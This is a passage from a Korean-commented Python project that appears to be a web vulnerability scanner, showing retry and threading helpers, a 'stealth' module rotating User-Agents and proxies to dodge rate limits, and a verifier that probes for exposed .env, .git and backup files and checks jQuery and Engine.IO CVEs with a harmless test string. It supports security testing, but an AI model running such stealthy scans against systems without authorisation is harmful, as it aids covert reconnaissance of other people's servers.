    exceptions: tuple = (Exception,)
):
    """
    재시도 로직과 지수 백오프를 적용하는 데코레이터
    
    Args:
        max_attempts: 최대 시도 횟수
        initial_delay: 초기 지연 시간 (초)
        max_delay: 최대 지연 시간 (초)
        backoff_factor: 백오프 배수
        exceptions: 재시도할 예외 타입
    
    Example:
        @retry_with_backoff(max_attempts=3, initial_delay=1.0)
        def my_function():
            # ...
    """
    def decorator(func: Callable) -> Callable:
        @wraps(func)
        def wrapper(*args, **kwargs) -> Any:
            delay = initial_delay
            last_exception = None
            
            for attempt in range(1, max_attempts + 1):
                try:
                    return func(*args, **kwargs)
                except exceptions as e:
                    last_exception = e
                    
                    if attempt == max_attempts:
                        logger.warning(
                            f"{func.__name__} 실패 (최대 시도 횟수 도달): {e}"
                        )
                        raise
                    
                    logger.debug(
                        f"{func.__name__} 실패 (시도 {attempt}/{max_attempts}): {e}. "
                        f"{delay:.2f}초 후 재시도..."
                    )
                    
                    time.sleep(min(delay, max_delay))
                    delay *= backoff_factor
            
            if last_exception:
                raise last_exception
            
        return wrapper
    return decorator


def retry_on_network_error(
    max_attempts: int = 3,
    initial_delay: float = 2.0
):
    """
    네트워크 오류에 대한 재시도 데코레이터 (간편 버전)
    """
    import requests
    import socket
    
    return retry_with_backoff(
        max_attempts=max_attempts,
        initial_delay=initial_delay,
        exceptions=(
            requests.exceptions.RequestException,
            requests.exceptions.Timeout,
            requests.exceptions.ConnectionError,
            OSError,
            socket.error
        )
    )

```
---

## File 51: stealth.py
**Absolute Path:** `d:\3차 프로젝트\6트\12.26 app\app\core\utils\stealth.py`

```python
# app/core/utils/stealth.py
# 스텔스 모드 및 Rate Limiting 대응

import time
import random
import logging
from typing import Dict, Any, Optional, List
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

logger = logging.getLogger(__name__)


class StealthMode:
    """
    스텔스 모드: Rate Limiting 대응, User-Agent 로테이션 등
    """
    
    USER_AGENTS = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    ]
    
    def __init__(
        self,
        delay_min: float = 0.5,
        delay_max: float = 2.0,
        use_proxy: bool = False,
        proxy_list: Optional[List[str]] = None
    ):
        """
        Args:
            delay_min: 최소 딜레이 (초)
            delay_max: 최대 딜레이 (초)
            use_proxy: 프록시 사용 여부
            proxy_list: 프록시 리스트 (예: ["http://proxy1:8080", "http://proxy2:8080"])
        """
        self.delay_min = delay_min
        self.delay_max = delay_max
        self.use_proxy = use_proxy
        self.proxy_list = proxy_list or []
        self.current_ua_index = 0
        self.current_proxy_index = 0
    
    def random_delay(self):
        """랜덤 딜레이"""
        delay = random.uniform(self.delay_min, self.delay_max)
        time.sleep(delay)
        return delay
    
    def get_random_user_agent(self) -> str:
        """랜덤 User-Agent 반환"""
        return random.choice(self.USER_AGENTS)
    
    def rotate_user_agent(self) -> str:
        """User-Agent 로테이션"""
        ua = self.USER_AGENTS[self.current_ua_index]
        self.current_ua_index = (self.current_ua_index + 1) % len(self.USER_AGENTS)
        return ua
    
    def get_headers(self, custom_headers: Dict[str, str] = None) -> Dict[str, str]:
        """스텔스 모드 헤더 생성"""
        headers = {
            "User-Agent": self.rotate_user_agent(),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
        }
        
        if custom_headers:
            headers.update(custom_headers)
        
        return headers
    
    def get_proxy(self) -> Optional[Dict[str, str]]:
        """
        프록시 로테이션
        
        Returns:
            프록시 딕셔너리 또는 None
        """
        if not self.use_proxy or not self.proxy_list:
            return None
        
        proxy_url = self.proxy_list[self.current_proxy_index]
        self.current_proxy_index = (self.current_proxy_index + 1) % len(self.proxy_list)
        
        return {
            "http": proxy_url,
            "https": proxy_url
        }


class ConnectionPool:
    """
    연결 풀링을 위한 Session 관리
    """
    
    def __init__(self, max_retries: int = 3, pool_connections: int = 10, pool_maxsize: int = 20):
        """
        Args:
            max_retries: 최대 재시도 횟수
            pool_connections: 연결 풀 크기
            pool_maxsize: 최대 연결 수
        """
        import requests
        
        self.session = requests.Session()
        
        # 재시도 전략
        retry_strategy = Retry(
            total=max_retries,
            backoff_factor=1,
            status_forcelist=[429, 500, 502, 503, 504],
            allowed_methods=["GET", "POST", "PUT", "DELETE"]
        )
        
        # HTTP 어댑터 설정
        adapter = HTTPAdapter(
            max_retries=retry_strategy,
            pool_connections=pool_connections,
            pool_maxsize=pool_maxsize
        )
        
        self.session.mount("http://", adapter)
        self.session.mount("https://", adapter)
    
    def get_session(self):
        """Session 반환"""
        return self.session
    
    def close(self):
        """Session 종료"""
        self.session.close()


class TimeoutManager:
    """
    타임아웃 계층화 관리
    """
    
    def __init__(self, connect_timeout: float = 5.0, read_timeout: float = 10.0):
        """
        Args:
            connect_timeout: 연결 타임아웃 (초)
            read_timeout: 읽기 타임아웃 (초)
        """
        self.connect_timeout = connect_timeout
        self.read_timeout = read_timeout
    
    def get_timeout(self) -> tuple:
        """(connect_timeout, read_timeout) 튜플 반환"""
        return (self.connect_timeout, self.read_timeout)
    
    def get_total_timeout(self) -> float:
        """전체 타임아웃 반환"""
        return self.connect_timeout + self.read_timeout

```
---

## File 52: threading.py
**Absolute Path:** `d:\3차 프로젝트\6트\12.26 app\app\core\utils\threading.py`

```python
# app/core/utils/threading.py
# 멀티스레딩 유틸리티

from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List, Callable, Any, Optional
import logging

logger = logging.getLogger(__name__)

# tqdm이 있으면 진행 상황 표시, 없으면 기본 출력
try:
    from tqdm import tqdm
    HAS_TQDM = True
except ImportError:
    HAS_TQDM = False
    logger.warning("tqdm이 설치되지 않아 진행 상황 표시를 사용할 수 없습니다. 'pip install tqdm'으로 설치하세요.")


def parallel_execute(
    tasks: List[Callable],
    max_workers: int = 50,
    timeout: Optional[float] = None,
    show_progress: bool = True,
    desc: str = "Processing"
) -> List[Any]:
    """
    여러 작업을 병렬로 실행 (진행 상황 표시 포함)
    
    Args:
        tasks: 실행할 함수 리스트
        max_workers: 최대 워커 스레드 수 (기본값: 50)
        timeout: 각 작업의 타임아웃 (초)
        show_progress: 진행 상황 표시 여부
        desc: 진행 상황 표시 설명
    
    Returns:
        작업 결과 리스트 (순서는 보장되지 않음)
    """
    results = []
    
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        # 모든 작업 제출
        future_to_task = {executor.submit(task): task for task in tasks}
        
        # 완료된 작업부터 처리
        if show_progress and HAS_TQDM:
            iterator = tqdm(as_completed(future_to_task, timeout=timeout), 
                          total=len(future_to_task), desc=desc)
        else:
            iterator = as_completed(future_to_task, timeout=timeout)
        
        for future in iterator:
            task = future_to_task[future]
            try:
                result = future.result(timeout=30)
                results.append(result)
            except Exception as e:
                task_name = task.__name__ if hasattr(task, '__name__') else str(task)
                logger.error(f"작업 실행 실패 ({task_name}): {e}")
                results.append(None)
    
    return results


def parallel_map(
    func: Callable,
    items: List[Any],
    max_workers: int = 50,
    timeout: Optional[float] = None,
    show_progress: bool = True,
    desc: str = "Mapping"
) -> List[Any]:
    """
    map 함수의 병렬 버전 (진행 상황 표시 포함)
    
    Args:
        func: 각 아이템에 적용할 함수
        items: 처리할 아이템 리스트
        max_workers: 최대 워커 스레드 수 (기본값: 50)
        timeout: 각 작업의 타임아웃 (초)
        show_progress: 진행 상황 표시 여부
        desc: 진행 상황 표시 설명
    
    Returns:
        함수 적용 결과 리스트
    """
    tasks = [lambda item=item: func(item) for item in items]
    return parallel_execute(tasks, max_workers=max_workers, timeout=timeout, 
                          show_progress=show_progress, desc=desc)


def batch_process(
    items: List[Any],
    processor: Callable,
    batch_size: int = 10,
    max_workers: int = 20,
    show_progress: bool = True,
    desc: str = "Batch Processing"
) -> List[Any]:
    """
    아이템을 배치로 나누어 병렬 처리 (진행 상황 표시 포함)
    
    Args:
        items: 처리할 아이템 리스트
        processor: 각 배치를 처리할 함수 (배치 리스트를 받음)
        batch_size: 배치 크기
        max_workers: 최대 워커 스레드 수 (기본값: 20)
        show_progress: 진행 상황 표시 여부
        desc: 진행 상황 표시 설명
    
    Returns:
        처리 결과 리스트
    """
    # 배치로 나누기
    batches = [items[i:i + batch_size] for i in range(0, len(items), batch_size)]
    
    # 각 배치를 병렬 처리
    tasks = [lambda batch=batch: processor(batch) for batch in batches]
    batch_results = parallel_execute(tasks, max_workers=max_workers, 
                                    show_progress=show_progress, desc=desc)
    
    # 결과 합치기
    results = []
    for batch_result in batch_results:
        if batch_result:
            results.extend(batch_result)
    
    return results


def parallel_scan(
    targets: List[str],
    scan_func: Callable,
    max_workers: int = 50,
    timeout: Optional[float] = 30,
    show_progress: bool = True,
    desc: str = "Scanning"
) -> List[Any]:
    """
    병렬 스캔 (진행 상황 표시)
    
    Args:
        targets: 스캔 대상 리스트
        scan_func: 각 타겟에 적용할 스캔 함수
        max_workers: 최대 워커 스레드 수 (기본값: 50)
        timeout: 각 스캔의 타임아웃 (초)
        show_progress: 진행 상황 표시 여부
        desc: 진행 상황 표시 설명
    
    Returns:
        스캔 결과 리스트
    """
    return parallel_map(
        scan_func,
        targets,
        max_workers=max_workers,
        timeout=timeout,
        show_progress=show_progress,
        desc=desc
    )

```
---

## File 53: verifier.py
**Absolute Path:** `d:\3차 프로젝트\6트\12.26 app\app\core\verifier.py`

```python
# app/core/verifier.py
"""
Metasploit-style Vulnerability Verifier with Context-Aware Checks
- CVE 기반 취약점 검증
- 서버 환경 자동 감지 (OS/웹서버)
- 컨텍스트 기반 오탐 제거
"""

import requests
import re
import logging
from typing import Dict, Any, List
from urllib.parse import urljoin, urlparse
from packaging import version

logger = logging.getLogger(__name__)

# SSL 경고 무시 (개발 환경)
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

DEFAULT_USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"


class VulnerabilityVerifier:
    """
    Metasploit-style lightweight vulnerability checker
    
    1. Generic Checks (컨텍스트 인식)
    2. Specialized CVE Checks
    """
    
    def __init__(
        self,
        target_url: str,
        endpoints: List[str],
        cves: List[Dict[str, Any]],
        technologies: List[Dict[str, Any]]
    ):
        """
        Args:
            target_url: 타겟 URL (예: http://127.0.0.1:3000)
            endpoints: 검증할 API 엔드포인트
            cves: CVE 리스트
            technologies: 탐지된 기술 스택
        """
        self.target = target_url.rstrip("/")
        self.endpoints = endpoints
        self.cves = cves
        self.technologies = technologies
        self.results = []
        
        # 🆕 서버 컨텍스트 저장
        self.server_context = {
            "os": "unknown",         # linux, windows, unix, unknown
            "webserver": "unknown",  # apache, nginx, iis, tomcat, unknown
            "language": "unknown",   # php, python, nodejs, java, unknown
            "detected": False
        }
        
        # 기술 버전 정보 저장 (버전 비교용)
        self.tech_versions = {}
        for tech in technologies:
            product = tech.get("product", "").lower()
            ver = tech.get("version", "N/A")
            if ver != "N/A" and ver:
                self.tech_versions[product] = ver
        
        logger.info(f"[VERIFIER] Initialized for {target_url}")
        logger.info(f"[VERIFIER] Endpoints: {len(endpoints)}, CVEs: {len(cves)}, Technologies: {len(technologies)}")
    
    
    # ============================================================================
    # 🆕 Step 0: 서버 컨텍스트 자동 감지
    # ============================================================================
    
    def detect_server_context(self, web_info: Dict = None) -> Dict[str, str]:
        """
        서버 환경 자동 감지 (OS, 웹서버, 언어)
        
        Args:
            web_info: web.py에서 수집한 웹 정보
        
        Returns:
            {"os": "linux/windows", "webserver": "apache/nginx/iis", "language": "php/python"}
        """
        logger.info("[VERIFIER] 🔍 Step 0: Detecting server context...")
        
        # 1️⃣ HTTP 헤더에서 추출
        try:
            response = requests.head(self.target, timeout=5, verify=False, allow_redirects=True)
            server_header = response.headers.get("Server", "").lower()
            x_powered_by = response.headers.get("X-Powered-By", "").lower()
            
            logger.info(f"[VERIFIER] Server header: {server_header}")
            logger.info(f"[VERIFIER] X-Powered-By: {x_powered_by}")
            
            # 웹서버 감지
            if "apache" in server_header or "httpd" in server_header:
                self.server_context["webserver"] = "apache"
            elif "nginx" in server_header:
                self.server_context["webserver"] = "nginx"
            elif "microsoft-iis" in server_header or "iis" in server_header:
                self.server_context["webserver"] = "iis"
            elif "tomcat" in server_header:
                self.server_context["webserver"] = "tomcat"
            
            # OS 감지
            if "ubuntu" in server_header or "debian" in server_header:
                self.server_context["os"] = "linux"
            elif "centos" in server_header or "red hat" in server_header or "fedora" in server_header:
                self.server_context["os"] = "linux"
            elif "unix" in server_header:
                self.server_context["os"] = "unix"
            elif "win" in server_header or "microsoft" in server_header:
                self.server_context["os"] = "windows"
            
            # 언어 감지
            if "php" in x_powered_by:
                self.server_context["language"] = "php"
            elif "asp.net" in x_powered_by:
                self.server_context["language"] = "asp.net"
            elif "express" in x_powered_by or "nodejs" in x_powered_by:
                self.server_context["language"] = "nodejs"
            
        except Exception as e:
            logger.debug(f"[VERIFIER] HTTP header detection failed: {e}")
        
        # 2️⃣ 탐지된 기술에서 추출
        for tech in self.technologies:
            name = tech.get("name", "").lower()
            product = tech.get("product", "").lower()
            
            # 웹서버
            if "apache" in product or "httpd" in product:
                self.server_context["webserver"] = "apache"
            elif "nginx" in product:
                self.server_context["webserver"] = "nginx"
            elif "iis" in product:
                self.server_context["webserver"] = "iis"
            elif "tomcat" in product:
                self.server_context["webserver"] = "tomcat"
            
            # OS
            if "linux" in product or "ubuntu" in product or "debian" in product:
                self.server_context["os"] = "linux"
            elif "windows" in product:
                self.server_context["os"] = "windows"
            elif "unix" in product:
                self.server_context["os"] = "unix"
            
            # 언어
            if "php" in product:
                self.server_context["language"] = "php"
            elif "python" in product:
                self.server_context["language"] = "python"
            elif "node" in product or "nodejs" in product:
                self.server_context["language"] = "nodejs"
            elif "java" in product:
                self.server_context["language"] = "java"
        
        # 3️⃣ web_info에서 추가 정보 추출
        if web_info:
            for tech in web_info.get("web_technologies", []):
                name = tech.get("name", "").lower()
                
                if "apache" in name:
                    self.server_context["webserver"] = "apache"
                elif "nginx" in name:
                    self.server_context["webserver"] = "nginx"
                elif "iis" in name:
                    self.server_context["webserver"] = "iis"
                
                if "php" in name:
                    self.server_context["language"] = "php"
                elif "python" in name:
                    self.server_context["language"] = "python"
        
        self.server_context["detected"] = True
        
        logger.info(f"[VERIFIER] ✅ Server context detected:")
        logger.info(f"[VERIFIER]   - OS: {self.server_context['os']}")
        logger.info(f"[VERIFIER]   - Web Server: {self.server_context['webserver']}")
        logger.info(f"[VERIFIER]   - Language: {self.server_context['language']}")
        
        return self.server_context
    
    
    def get_context_aware_checks(self) -> Dict[str, Dict[str, Any]]:
        """
        서버 컨텍스트에 맞는 검사 항목 반환
        
        Returns:
            {"/path": {"keywords": [...], "severity": "...", "description": "..."}}
        """
        os_type = self.server_context.get("os", "unknown")
        webserver = self.server_context.get("webserver", "unknown")
        language = self.server_context.get("language", "unknown")
        
        # 기본 체크 항목 (모든 환경)
        checks = {
            "/.env": {
                "keywords": ["DB_PASSWORD", "API_KEY", "SECRET"],
                "severity": "critical",
                "description": "Environment configuration file exposed"
            },
            "/.git/config": {
                "keywords": ["core", "repositoryformatversion"],
                "severity": "high",
                "description": "Git repository metadata exposed"
            },
            "/admin": {
                "keywords": ["admin", "dashboard", "control panel"],
                "severity": "medium",
                "description": "Admin panel accessible"
            },
            "/backup": {
                "keywords": ["Index of", "backup", ".sql", ".zip"],
                "severity": "high",
                "description": "Backup files exposed"
            },
        }
        
        # 🆕 Windows + IIS 환경에서만 web.config 체크
        if os_type == "windows" or webserver == "iis":
            checks["/web.config"] = {
                "keywords": ["configuration", "connectionString", "appSettings"],
                "severity": "high",
                "description": "ASP.NET configuration file exposed"
            }
            checks["/Web.config"] = checks["/web.config"]  # 대소문자 구분
            logger.info("[VERIFIER] ✅ Added Windows/IIS checks: web.config")
        else:
            logger.info("[VERIFIER] ⏩ Skipped web.config (not Windows/IIS)")
        
        # 🆕 Linux + Apache 환경에서만 .htaccess 체크
        if (os_type == "linux" or os_type == "unix") or webserver == "apache":
            checks["/.htaccess"] = {
                "keywords": ["RewriteRule", "Allow from", "Deny from"],
                "severity": "medium",
                "description": "Apache configuration file exposed"
            }
            logger.info("[VERIFIER] ✅ Added Linux/Apache checks: .htaccess")
        else:
            logger.info("[VERIFIER] ⏩ Skipped .htaccess (not Linux/Apache)")
        
        # 🆕 PHP 환경에서만 PHP 관련 체크
        if language == "php":
            checks["/config.php"] = {
                "keywords": ["<?php", "DB_HOST", "mysql"],
                "severity": "high",
                "description": "PHP configuration file exposed"
            }
            checks["/phpmyadmin"] = {
                "keywords": ["phpMyAdmin", "pma_username"],
                "severity": "high",
                "description": "Database management interface exposed"
            }
            logger.info("[VERIFIER] ✅ Added PHP checks: config.php, phpmyadmin")
        else:
            logger.info("[VERIFIER] ⏩ Skipped PHP checks (not PHP environment)")
        
        # 🆕 Node.js 환경에서만 package.json 체크
        if language == "nodejs":
            checks["/package.json"] = {
                "keywords": ["dependencies", "scripts", "version"],
                "severity": "low",
                "description": "Node.js package configuration exposed"
            }
            logger.info("[VERIFIER] ✅ Added Node.js checks: package.json")
        
        logger.info(f"[VERIFIER] Total checks to perform: {len(checks)}")
        return checks
    
    
    # ============================================================================
    # Step 1: Generic HTTP Security Checks
    # ============================================================================
    
    def verify_all(self) -> List[Dict[str, Any]]:
        """
        전체 검증 실행
        
        Returns:
            검증 결과 리스트
        """
        print("=" * 70)
        print("[VERIFIER] 🎯 Starting Vulnerability Verification")
        print("=" * 70)
        
        # 🆕 Step 0: 서버 컨텍스트 감지
        self.detect_server_context()
        
        # Step 1: Generic HTTP Security Checks
        print("[VERIFIER] Step 1: Generic HTTP Security Checks...")
        sensitive_paths = self.get_context_aware_checks()
        
        for path, config in sensitive_paths.items():
            self.generic_path_check(path, config)
        
        # Step 2: Specialized CVE Verification
        print("[VERIFIER] Step 2: Specialized CVE Verification...")
        self.run_specialized_checks()
        
        # Step 3: Version-based CVE Confirmation
        print("[VERIFIER] Step 3: Version-based CVE Confirmation...")
        self.run_version_confirmation()
        
        print("=" * 70)
        print(f"[VERIFIER] ✅ Verification Complete: {len(self.results)} checks performed")
        print("=" * 70)
        
        return self.results
    
    
    def generic_path_check(self, path: str, config: Dict[str, Any]):
        """
        일반적인 경로 검사
        
        Args:
            path: 검사할 경로 (예: "/.env")
            config: {"keywords": [...], "severity": "...", "description": "..."}
        """
        result = {
            "cve_id": "GENERIC-CHECK",
            "check_type": "generic",
            "endpoint": path,
            "exploitable": False,
            "confidence": "low",
            "severity": config["severity"],
            "evidence": "",
            "method": "http-get",
            "description": config["description"],
            "safe": True
        }
        
        try:
            url = urljoin(self.target, path)
            response = requests.get(
                url,
                timeout=5,
                verify=False,
                headers={"User-Agent": DEFAULT_USER_AGENT},
                allow_redirects=False
            )
            
            # 성공 응답
            if response.status_code == 200:
                content = response.text.lower()
                matched_keywords = [kw for kw in config["keywords"] if kw.lower() in content]
                
                if matched_keywords:
                    result["exploitable"] = True
                    result["confidence"] = "high"
                    result["evidence"] = f"Keywords found: {', '.join(matched_keywords[:3])}"
                    print(f"[VERIFIER]   🚨 EXPLOITABLE: {path} - {config['description']}")
                else:
                    result["evidence"] = "No sensitive keywords detected"
                    print(f"[VERIFIER]   ℹ️  ACCESSIBLE: {path} (but no sensitive content)")
            
            # 리다이렉트
            elif response.status_code in [301, 302, 303, 307, 308]:
                result["evidence"] = f"Redirected (HTTP {response.status_code}) to {response.headers.get('Location', 'unknown')}"
                print(f"[VERIFIER]   ℹ️  REDIRECT: {path}")
            
            # 접근 금지
            elif response.status_code == 403:
                result["evidence"] = f"Forbidden (HTTP {response.status_code})"
                print(f"[VERIFIER]   ✅ PROTECTED: {path}")
            
            # 기타
            else:
                result["evidence"] = f"Not accessible (HTTP {response.status_code})"
                print(f"[VERIFIER]   ✅ SAFE: {path}")
        
        except requests.Timeout:
            result["evidence"] = "Request timeout"
            print(f"[VERIFIER]   ⏱️  TIMEOUT: {path}")
        
        except Exception as e:
            result["evidence"] = f"Check failed: {str(e)}"
            logger.debug(f"[VERIFIER] Generic check error for {path}: {e}")
        
        self.results.append(result)
    
    
    # ============================================================================
    # Step 2: Specialized CVE Checks
    # ============================================================================
    
    def run_specialized_checks(self):
        """
        특정 CVE에 대한 전문 검증 실행
        """
        specialized_handlers = {
            "CVE-2015-9251": self.verify_jquery_xss,
            "CVE-2019-11358": self.verify_jquery_prototype_pollution,
            "CVE-2020-11022": self.verify_jquery_html_injection,
            "CVE-2020-11023": self.verify_jquery_html_injection,
            "CVE-2022-41940": self.verify_engineio_dos,
            "CVE-2022-21676": self.verify_engineio_uncaught_exception,
            "CVE-2023-31125": self.verify_engineio_http_parsing,
        }
        
        for cve in self.cves:
            cve_id = cve.get("cve_id", "")
            
            if cve_id in specialized_handlers:
                print(f"[VERIFIER]   Verifying {cve_id}...")
                handler = specialized_handlers[cve_id]
                
                # 엔드포인트가 있으면 각각 테스트
                if self.endpoints:
                    for endpoint in self.endpoints[:5]:  # 최대 5개
                        result = handler(endpoint, cve)
                        self.results.append(result)
                else:
                    # 엔드포인트 없으면 루트 테스트
                    result = handler("/", cve)
                    self.results.append(result)
    
    
    def verify_jquery_xss(self, endpoint: str, cve: Dict[str, Any]) -> Dict[str, Any]:
        """jQuery XSS (CVE-2015-9251)"""
        result = {
            "cve_id": "CVE-2015-9251",
            "check_type": "specialized",
            "endpoint": endpoint,
            "exploitable": False,
            "confidence": "low",
            "severity": cve.get("severity", "medium"),
            "evidence": "",
            "method": "version-check + safe-payload",
            "description": "jQuery <3.0.0 Cross-site Scripting (XSS)",
            "safe": True
        }
        
        try:
            jquery_version = self.tech_versions.get("jquery", None)
            
            if not jquery_version:
                result["evidence"] = "jQuery version not detected"
                return result
            
            if self.is_vulnerable_version(jquery_version, "<", "3.0.0"):
                result["confidence"] = "medium"
                result["evidence"] = f"jQuery {jquery_version} < 3.0.0 detected"
                
                # Safe payload 테스트 (실제 악성 코드 X)
                url = urljoin(self.target, endpoint)
                test_html = "<img src=x>"
                response = requests.post(
                    url,
                    data={"content": test_html},
                    timeout=5,
                    verify=False
                )
                
                if "<img src=x>" in response.text and "sanitize" not in response.text.lower():
                    result["exploitable"] = True
                    result["confidence"] = "high"
                    result["evidence"] = "Unsafe HTML rendering detected (no sanitization)"
                else:
                    result["evidence"] = "HTML appears to be sanitized"
            else:
                result["evidence"] = f"jQuery {jquery_version} >= 3.0.0 (patched)"
        
        except Exception as e:
            result["evidence"] = f"Verification failed: {str(e)}"
            logger.debug(f"[VERIFIER] jQuery XSS check error: {e}")
        
        return result
    
    
    def verify_jquery_prototype_pollution(self, endpoint: str, cve: Dict[str, Any]) -> Dict[str, Any]:
        """jQuery Prototype Pollution (CVE-2019-11358)"""
        result = {
            "cve_id": "CVE-2019-11358",
            "check_type": "specialized",
            "endpoint": endpoint,
            "exploitable": False,
            "confidence": "low",
            "severity": cve.get("severity", "medium"),
            "evidence": "",
            "method": "version-check + pattern-detection",
            "description": "jQuery <3.4.0 Prototype Pollution",
            "safe": True
        }
        
        try:
            jquery_version = self.tech_versions.get("jquery", None)
            
            if not jquery_version:
                result["evidence"] = "jQuery version not detected"
                return result
            
            if self.is_vulnerable_version(jquery_version, "<", "3.4.0"):
                result["exploitable"] = True
                result["confidence"] = "high"
                result["evidence"] = f"jQuery {jquery_version} < 3.4.0 detected (vulnerable to prototype pollution)"
            else:
                result["evidence"] = f"jQuery {jquery_version} >= 3.4.0 (patched)"
        
        except Exception as e:
            result["evidence"] = f"Verification failed: {str(e)}"
        
        return result
    
    
    def verify_jquery_html_injection(self, endpoint: str, cve: Dict[str, Any]) -> Dict[str, Any]:
        """jQuery HTML Injection (CVE-2020-11022, CVE-2020-11023)"""
        cve_id = cve.get("cve_id", "CVE-2020-11022")
        
        result = {
            "cve_id": cve_id,
            "check_type": "specialized",
            "endpoint": endpoint,
            "exploitable": False,
            "confidence": "low",
            "severity": cve.get("severity", "medium"),
            "evidence": "",
            "method": "version-check",
            "description": "jQuery <3.5.0 HTML Injection",
            "safe": True
        }
        
        try:
            jquery_version = self.tech_versions.get("jquery", None)
            
            if not jquery_version:
                result["evidence"] = "jQuery version not detected"
                return result
            
            if self.is_vulnerable_version(jquery_version, "<", "3.5.0"):
                result["exploitable"] = True
                result["confidence"] = "high"
                result["evidence"] = f"jQuery {jquery_version} < 3.5.0 detected (vulnerable to HTML injection)"
            else:
                result["evidence"] = f"jQuery {jquery_version} >= 3.5.0 (patched)"
        
        except Exception as e:
            result["evidence"] = f"Verification failed: {str(e)}"
        
        return result
    
    
    def verify_engineio_dos(self, endpoint: str, cve: Dict[str, Any]) -> Dict[str, Any]:
        """Engine.IO DoS (CVE-2022-41940)"""
        result = {
            "cve_id": "CVE-2022-41940",
            "check_type": "specialized",
            "endpoint": endpoint,
            "exploitable": False,
            "confidence": "low",
            "severity": cve.get("severity", "high"),
            "evidence": "",
            "method": "endpoint-detection + safe-request",
            "description": "Engine.IO <6.2.1 Denial of Service",
            "safe": True
        }
        
        try:
            url = urljoin(self.target, endpoint)
            
            # Engine.IO 엔드포인트 감지
            response = requests.get(
                url,
                params={"EIO": "4", "transport": "polling"},
                timeout=5,
                verify=False
            )
            
            if "engine.io" in response.text.lower() or response.text.startswith("0"):
                result["exploitable"] = True
                result["confidence"] = "high"
                result["evidence"] = "Engine.IO protocol detected (potentially vulnerable)"
            else:
                result["evidence"] = f"Engine.IO not responding (HTTP {response.status_code})"
        
        except Exception as e:
            result["evidence"] = f"Verification failed: {str(e)}"
        
        return result
    
    
    def verify_engineio_uncaught_exception(self, endpoint: str, cve: Dict[str, Any]) -> Dict[str, Any]:
        """Engine.IO Uncaught Exception (CVE-2022-21676)"""
        result = {
            "cve_id": "CVE-2022-21676",
            "check_type": "specialized",
            "endpoint": endpoint,
            "exploitable": False,
            "confidence": "low",
            "severity": cve.get("severity", "high"),
            "evidence": "",
            "method": "endpoint-detection",
            "description": "Engine.IO <4.1.2 Uncaught Exception",
            "safe": True
        }
        
        if "engine.io" in endpoint.lower():
            result["exploitable"] = True
            result["confidence"] = "medium"
            result["evidence"] = "Engine.IO endpoint detected (version check required for confirmation)"
        else:
            result["evidence"] = "Not an Engine.IO endpoint"
        
        return result
    
    
    def verify_engineio_http_parsing(self, endpoint: str, cve: Dict[str, Any]) -> Dict[str, Any]:
        """Engine.IO HTTP Parsing Vulnerability (CVE-2023-31125)"""
        result = {
            "cve_id": "CVE-2023-31125",
            "check_type": "specialized",
            "endpoint": endpoint,
            "exploitable": False,
            "confidence": "low",
            "severity": cve.get("severity", "medium"),
            "evidence": "",
            "method": "endpoint-detection",
            "description": "Engine.IO HTTP Request Parsing Vulnerability",
            "safe": True
        }
        
        if "engine.io" in endpoint.lower():
            result["exploitable"] = True
            result["confidence"] = "medium"
            result["evidence"] = "Engine.IO endpoint detected (potentially vulnerable)"
        else:
            result["evidence"] = "Not an Engine.IO endpoint"
        
        return result
    
    
    # ============================================================================
    # Step 3: Version-to-CVE Confirmation
    # ============================================================================
    
    def run_version_confirmation(self):
        """
        NVD 버전 정보와 탐지된 버전 비교
        """
        for cve in self.cves:
            cve_id = cve.get("cve_id", "")
            affected_products = cve.get("affected_products", [])
            
            for product_name, version_range in affected_products:
                detected_version = self.tech_versions.get(product_name, None)
                
                if detected_version:
                    result = {
                        "cve_id": cve_id,
                        "check_type": "version_confirmation",
                        "endpoint": "N/A",
                        "exploitable": False,
                        "confidence": "low",
                        "severity": cve.get("severity", "unknown"),
                        "evidence": "",
                        "method": "version_comparison",
                        "description": f"{product_name.title()} version matches CVE affected range",
                        "safe": True
                    }
                    
                    if self.version_in_range(detected_version, version_range):
                        result["exploitable"] = True
                        result["confidence"] = "high"
                        result["evidence"] = f"{product_name} {detected_version} matches affected range: {version_range}"
                        print(f"[VERIFIER]   ✅ CONFIRMED: {cve_id} affects {product_name} {detected_version}")
                    else:
                        result["evidence"] = f"{product_name} {detected_version} NOT in affected range: {version_range}"
                        print(f"[VERIFIER]   ✅ SAFE: {cve_id} does not affect {product_name} {detected_version}")
                    
                    self.results.append(result)
    
    
    # ============================================================================
    # Helper Functions
    # ============================================================================
    
    def is_vulnerable_version(self, current: str, operator: str, threshold: str) -> bool:
        """
        버전 비교
        
        Args:
            current: "2.2.4"
            operator: "<", "<=", ">", ">=", "=="
            threshold: "3.0.0"
        
        Returns:
            True if vulnerable
        """
        try:
            curr_ver = version.parse(current)
            threshold_ver = version.parse(threshold)
            
            if operator == "<":
                return curr_ver < threshold_ver
            elif operator == "<=":
                return curr_ver <= threshold_ver
            elif operator == ">":
                return curr_ver > threshold_ver
            elif operator == ">=":
                return curr_ver >= threshold_ver
            elif operator == "==":
                return curr_ver == threshold_ver
            else:
                return False
        
        except Exception as e:
